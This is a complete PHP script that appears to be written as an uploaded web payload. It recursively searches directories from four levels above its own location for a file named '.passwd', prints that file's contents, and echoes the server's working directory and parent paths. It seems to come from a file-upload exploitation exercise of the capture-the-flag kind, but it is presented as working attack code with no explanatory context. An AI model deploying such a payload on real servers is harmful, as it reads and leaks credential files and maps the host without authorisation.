<?php
// Define a function to recursively traverse directories
function read_passwd($dir) {
  // Check if the directory is readable before proceeding
  if (!is_readable($dir)) {
    return false; // Skip if directory is not readable
  }

  // List files and directories in the current directory
  $files = scandir($dir);

  // Iterate through the files and directories
  foreach($files as $file) {
    // Skip '.' and '..' (current and parent directory)
    if ($file == '.' || $file == '..') {
      continue;
    }

    // Construct the full path to the file/directory
    $path = $dir . '/' . $file;

    // Check if it's a file named '.passwd'
    if (is_file($path) && $file == '.passwd') {
      // Read and return the contents of the .passwd file
      return file_get_contents($path);
    }

    // If it's a directory, recursively call this function
    if (is_dir($path)) {
      $result = read_passwd($path);
      if ($result !== false) {
        return $result;
      }
    }
  }

  // If .passwd not found in current directory or its subdirectories
  return false;
}

// Start traversing from four levels up (relative to the uploaded file)
$passwd_content = read_passwd(dirname(dirname(dirname(dirname(__FILE__)))));

// Echo the current working directory 
echo "Current Directory: " . getcwd() . "<br>";

// To go one level up:
$oneLevelUp = dirname(__FILE__);
echo "One Level Up: " . $oneLevelUp . "<br>";

// To go two levels up:
$twoLevelsUp = dirname(dirname(__FILE__));
echo "Two Levels Up: " . $twoLevelsUp . "<br>";

$threeLevelsUp = dirname(dirname(dirname(__FILE__)));
echo "Three Levels Up: " . $threeLevelsUp . "<br>";

$fourLevelsUp = dirname(dirname(dirname(dirname(__FILE__))));
echo "Four Levels Up: " . $fourLevelsUp . "<br>";

// Check if the .passwd file was found
if ($passwd_content !== false) {
  echo "Contents of .passwd:\n";
  echo $passwd_content;
} else {
  echo "Error: .passwd file not found.";
}
?>
